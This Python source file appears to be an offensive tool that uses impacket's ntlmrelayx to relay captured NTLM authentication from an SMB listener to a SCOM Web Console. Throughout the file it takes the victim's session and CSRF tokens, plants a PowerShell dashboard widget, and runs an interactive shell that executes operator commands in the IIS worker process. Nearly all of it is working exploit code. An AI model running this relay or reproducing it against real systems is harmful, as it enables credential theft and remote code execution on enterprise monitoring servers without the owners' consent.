import base64
import time
import json
import urllib.parse
from struct import unpack
from threading import Lock

from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.ntlm import NTLMAuthChallengeResponse
from impacket.spnego import SPNEGO_NegTokenResp

try:
    from http.client import HTTPConnection
except ImportError:
    from httplib import HTTPConnection


from lib.logger import logger
    

class SCOMHTTPRelayClient(HTTPRelayClient):
    def initConnection(self):
        logger.debug("Connecting to %s:%s..." % (self.targetHost, self.targetPort))
        self.session = HTTPConnection(
            self.targetHost, self.targetPort, timeout=self.scom_relay.timeout
        )
        self.session.connect()
        logger.debug("Connected to %s:%s" % (self.targetHost, self.targetPort))
        self.lastresult = None
        if self.target.path == "":
            self.path = "/"
        else:
            self.path = self.target.path
        return True

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        self.scom_relay.attack_lock.acquire()
        try:
            response = self._sendAuth(authenticateMessageBlob, serverChallenge)
        except Exception as e:
            logger.info(f"Something went wrong:\n{e}")
            response = None, STATUS_ACCESS_DENIED
        finally:
            self.scom_relay.attack_lock.release()
            return response

    def _sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if (
            unpack("B", authenticateMessageBlob[:1])[0]
            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
        ):
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2["ResponseToken"]
        else:
            token = authenticateMessageBlob

        try:
            response = NTLMAuthChallengeResponse()
            response.fromString(data=token)

            domain = response["domain_name"].decode("utf-16le")
            username = response["user_name"].decode("utf-16le")

            self.user = "%s\\%s" % (domain, username)
            self.session.user = self.user

            logger.info(f"Authenticating with user: {self.user}")

            auth = base64.b64encode(token).decode("ascii")
            headers = {
                "Authorization": "%s %s" % (self.authenticationMethod, auth),
                "Content-Type": "application/json"
            }
            
            body_data = '"V2luZG93cw=="'.encode("utf-8")
            
            self.session.request("POST", self.path, headers=headers, body=body_data)
            res = self.session.getresponse()

            session_id = None
            csrf_token = None
            cookies = []
            
            for header, value in res.getheaders():
                if header.lower() == 'set-cookie':
                    cookies.append(value.split(';')[0])
                    if 'SCOMSessionId=' in value:
                        session_id = urllib.parse.unquote(value.split('SCOMSessionId=')[1].split(';')[0])
                    elif 'SCOM-CSRF-TOKEN=' in value:
                        csrf_token = urllib.parse.unquote(value.split('SCOM-CSRF-TOKEN=')[1].split(';')[0])

            # SCOM 2019 and up requires these tokens https://learn.microsoft.com/en-us/rest/operationsmanager/
            if session_id and csrf_token:
                self.scom_relay.session_info = {
                    'session_id': session_id,
                    'csrf_token': csrf_token,
                    'cookies': '; '.join(cookies)
                }
                
                self.scom_relay.headers = {
                    'Content-Type': 'application/json; charset=utf-8',
                    'Cookie': '; '.join(cookies),
                    'SCOM-CSRF-TOKEN': csrf_token
                }
                
                logger.debug(f"Extracted session info: {self.scom_relay.session_info}")
                
                response_data = res.read()
                if res.status == 200:
                    logger.info("Authentication successful")
                    logger.debug(f"Response data: {response_data.decode('utf-8', errors='ignore')}")
                else:
                    logger.info(f"Unexpected status code: {res.status}")
                    logger.debug(f"Response data: {response_data.decode('utf-8', errors='ignore')}")

            if res.status == 401:
                logger.info("Got unauthorized response from SCOM Web Console")
                return None, STATUS_ACCESS_DENIED
            else:
                logger.debug(
                    "HTTP server returned code %d, treating as a successful login"
                    % res.status
                )
                # Cache this for later use
                self.lastresult = response_data
                return None, STATUS_SUCCESS
        except Exception as e:
            logger.info(f"Something went wrong:\n{e}")
            return None, STATUS_ACCESS_DENIED


class SCOMWEBCONSOLEAttackClient(ProtocolAttack):
    def run(self):
        self.scom_relay.attack_lock.acquire()
        try:
            self._run()
        except Exception as e:
            logger.info(f"Something went wrong:\n{e}")
        finally:
            self.scom_relay.attack_lock.release()

    def _run(self):
        if (hasattr(self.client, 'user')
            and self.client.user in self.scom_relay.attacked_targets
        ):
            logger.debug(
                "Skipping user %s since attack was already performed"
                % repr(self.client.user)
            )
            return
         
        try:
            dashboard_id = self.create_dashboard() #create the dashboard
            if dashboard_id:
                logger.info(f"Successfully created dashboard with ID: {dashboard_id}")
            else:
                logger.info("Failed to create dashboard") # no point in continuing if we dont have a dashboard
                exit()

            # add starter script to the console
            widget_script = self.pwsh_widget_script()

            #format the widget body contents
            widget_body = self.widget_body(widget_script)

            # actually create the widget 
            widget_id = self.make_widget(dashboard_id, widget_body)

            if widget_id:
                logger.info(f"Successfully created widget with ID: {widget_id}")
            else:
                loger.info("Failed to create widget") # need the widget, exit since we're failing
                logger.info("Save the dashboard ID for later cleanup")
                exit()

            # accept commands from the user to run on direct os
            # you'll be in IIS worker process and will have SeImpersonatePrivilege
            interactive = True
            logger.info("Dropping into emulated shell.")
            logger.warning("[!] Be sure use the exit command when finished otherwise the dashboard persists.")
            while interactive:
                command = ((input(r"C:\>")))
                if command.lower() == 'exit':
                    interactive = False
                    logger.info("Exiting shell")
                    break
                else:
                    processed_command = self.widget_body(self.pwsh_widget_script(command))
                    updated_widget = self.update_widget(widget_id, processed_command)
                    if updated_widget:
                        command_result = self.run_widget(widget_id)
                        if command_result:
                            self.handle_result(command_result)
            
            # we're done, clean up the dashboard
            self.delete_dashboard(dashboard_id)

        except Exception as e:
            logger.info(f"An error occured during the relay: \n{str(e)}")
            
        # Mark attack as complete
        self.finish_run()
    
    def create_dashboard(self):
        """Creates a dashboard in SCOM"""
        try:
            dashboard_body = {
                "path": "pocdashboard",
                "name": "pocdashboard",
                "description": "This is a PoC dashboard created via the API",
                "config": None,
                "componentType": None
            }
            
            dashboard_json = json.dumps(dashboard_body).encode('utf-8')
            dashboard_path = '/OperationsManager/myWorkspace/Dashboard'
            logger.info(f"Creating dashboard at {dashboard_path}")

            self.client.request(
                'POST', 
                dashboard_path, 
                body=dashboard_json,
                headers=self.scom_relay.headers
            )
            
            response = self.client.getresponse()
            content = response.read()
            
            if response.status == 200:
                try:
                    response_data = json.loads(content.decode('utf-8'))
                    dashboard_id = response_data.get('id')
                    return dashboard_id
                except json.JSONDecodeError:
                    logger.debug("Failed to parse response as JSON")
                    logger.debug(f"Raw response: {content.decode('utf-8', errors='ignore')}")
            else:
                logger.info(f"Received status code {response.status} when creating dashboard")
                
            return None

        except Exception as e:
            logger.info(f"Something went wrong:\n{e}")
            return None

    def pwsh_widget_script(self, command=""):
        """Format the PowerShell script to run in the console"""
        script = '''
$CommandResult = %s
$CommandLines = $CommandResult -split "`n"
$idCounter = 1
foreach ($line in $CommandLines) {
    $trimmedLine = $line.Trim()
    if ($trimmedLine -ne "") {
        $dataObject = $ScriptContext.CreateInstance('xsd://instance/name')
        $dataObject['Id'] = $idCounter.ToString()
        $idCounter++
        $dataObject['CommandResult'] = $trimmedLine
        $ScriptContext.ReturnCollection.Add($dataObject)
    }
}
'''% command
        script.replace('\n', '\\n').replace('\r', '\\r').replace('"', '\\"')
        return script

    def widget_body(self, script):
        """Format the widget contents to send to the console"""
        widget_config = {
            "widgetDisplay": {"col": 0, "row": 0, "sizex": 0, "sizey": 0},
            "widgetParameters": {"script": script},
            "widgetRefreshInterval": 5
        }

        widget_body = {
            "name": "poc_pwsh_widget",
            "description": "poc widget created via API",
            "config": json.dumps(widget_config),
            "componentType": "HtmlPowershellWidget"
        }
        widget_body_json = json.dumps(widget_body).encode('utf-8')
        return widget_body_json

    def make_widget(self, dashboard_id, widget_body):
        """Create a PowerShell Widget in SCOM"""
        try:
            widget_path = f'/OperationsManager/myWorkspace/dashboard/{dashboard_id}/widget'
            logger.info(f"Creating widget at {widget_path}")

            self.client.request(
                'POST', 
                widget_path, 
                body=widget_body,
                headers=self.scom_relay.headers
            )

            response = self.client.getresponse()
            content = response.read()
            
            if response.status == 200:
                response_data = json.loads(content.decode('utf-8'))
                widget_id = response_data.get('id')
                return widget_id
            else:
                logger.info(f"Received status code {response.status} when creating widget")
                return None
            
        except json.JSONDecodeError:
            logger.debug("Failed to parse response as JSON")
            logger.debug(f"Raw response: {content.decode('utf-8', errors='ignore')}")
        except Exception as e:
            logger.info(f"Something went wrong:\n{e}")
    
    def run_widget(self, widget_id):
        """Run the widget and process results"""
        run_widget_path = '/OperationsManager/data/powershell/?widgetId=%s&dashboardType=MYWORKSPACE' % widget_id
        self.client.request(
            'GET', 
            run_widget_path,
            headers=self.scom_relay.headers)
        response = self.client.getresponse()
        content = response.read()
        if response.status == 200:
            try:
                command_results = []
                widget_result = json.loads(content.decode('utf-8'))
                if 'rows' in widget_result and isinstance(widget_result['rows'], list) and widget_result['rows']:
                    for row in widget_result['rows']:
                        if 'commandresult' in row:
                            command_results.append(row['commandresult'])
                    return command_results
                else:
                    logger.info("commandresult key was empty, returning entire response")
                    return widget_result
            except json.JSONDecodeError:
                    logger.debug("Failed to parse response as JSON")
                    logger.debug(f"Raw response: {content.decode('utf-8', errors='ignore')}")
        else:
            logger.info(f"Received status code {response.status} when creating widget")
    
    def update_widget(self, widget_id, processed_command):
        """Update an existing widget by Widget ID"""
        try:
            update_widget_path = f'/OperationsManager/myWorkspace/widget/{widget_id}'
            self.client.request('PUT', 
                                update_widget_path,
                                body=processed_command,
                                headers=self.scom_relay.headers)
            response = self.client.getresponse()
            response.read()
            if response.status == 200:
                return True
            else:
                return False
        except Exception as e:
            logger.info(e)

    def handle_result(self, command_result):
        """Helper to logger.info any results from widget runs"""
        if isinstance(command_result, list):
            for item in command_result:
                print(item)
            return
        else:
            logger.info(command_result)
            return

    def delete_dashboard(self, dashboard_id):
        """Delete the dashboard from SCOM"""
        try:
            delete_dashboard_path = f'/OperationsManager/myWorkspace/dashboard/{dashboard_id}'
            logger.info(f"Deleting dashboard at {delete_dashboard_path}")
            self.client.request('DELETE', 
                                delete_dashboard_path,
                                headers=self.scom_relay.headers)
            response = self.client.getresponse()
            response.read()
            if response.status == 200:
                logger.info(f"Dashboard {dashboard_id} deleted sucecssfully.")
                return True
            else:
                return False
        except Exception as e:
            logger.info(e)

    def finish_run(self):
        """Mark the attack as complete and potentially shut down"""
        if hasattr(self.client, 'user'):
            self.scom_relay.attacked_targets.append(self.client.user)
        self.scom_relay.shutdown()

class HTTPSCOMRELAY:
    def __init__(self, target:str, interface:str, port:int, timeout:int, verbose:bool,
    ):
        self.target = target
        self.interface = interface
        self.port = port
        self.timeout = timeout
        self.attacked_targets = []
        self.attack_lock = Lock()
        self.server = None
        self.headers = None
        self.session_info = None
        self.verbose = verbose

        

        # check the target
        if not self.target.startswith("http://") and not self.target.startswith("https://"):
            self.target = "http://%s" % self.target
        if not self.target.endswith("/OperationsManager/authenticate"):
            if not self.target.endswith("/"):
                self.target += "/"
            self.target += "OperationsManager/authenticate"
        logger.info("Targeting SCOM Web Console at %s" % self.target)

        target_processor = TargetsProcessor(
            singleTarget=self.target, 
            protocolClients={"HTTP": self.get_relay_http_client}
        )

        config = NTLMRelayxConfig()
        config.setTargets(target_processor)
        config.setAttacks({"HTTP": self.get_attack_http_client})
        config.setProtocolClients({"HTTP": self.get_relay_http_client})
        config.setListeningPort(port)
        config.setInterfaceIp(interface)
        config.setSMB2Support(True)
        config.setMode("RELAY")

        self.server = SMBRelayServer(config)

    def start(self):
        """All taken from Certipy's relay implementation https://github.com/ly4k/Certipy"""
        logger.info("Listening on %s:%d" % (self.interface, self.port))
        logger.info("Waiting for incoming connections...")

        self.server.start()

        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt, exiting...")
            self.shutdown()
        except Exception as e:
            logger.debug(e)

    def get_relay_http_client(self, *args, **kwargs):
        relay_client = SCOMHTTPRelayClient(*args, **kwargs)
        relay_client.scom_relay = self
        return relay_client

    def get_attack_http_client(self, *args, **kwargs):
        attack_client = SCOMWEBCONSOLEAttackClient(*args, **kwargs)
        attack_client.scom_relay = self
        return attack_client

    def shutdown(self):
        logger.info("Job done...")
        exit()

